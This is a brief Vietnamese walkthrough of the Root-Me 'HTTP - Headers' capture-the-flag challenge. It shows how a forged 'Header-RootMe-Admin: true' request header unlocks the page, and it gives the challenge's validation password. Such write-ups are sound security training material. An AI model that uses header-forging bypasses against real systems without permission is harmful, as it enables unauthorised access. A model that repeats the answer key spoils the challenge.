# HTTP - Headers

## Solution

- Khi sử dụng Live HTTP Headers, tìm thấy tham số này trong response từ máy chủ:

```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 29 Apr 2015 02:55:54 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
{{Header-RootMe-Admin: none}}
Content-Encoding: gzip
```

- Sau đó sử dụng BurpSuite, gửi lại request HTTP như sau:

```
GET /web-serveur/ch5/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.6.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://www.root-me.org/en/Challenges/Web-Server/HTTP-Headers
Connection: keep-alive
Header-RootMe-Admin: true
Content-Length: 2
```

- Cuối cùng kết quả là:

```
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 29 Apr 2015 03:19:29 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Header-RootMe-Admin: none
Content-Length: 366

<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='http://www.root-me.org/spip.php?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
<p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful</p></body>
</html>
```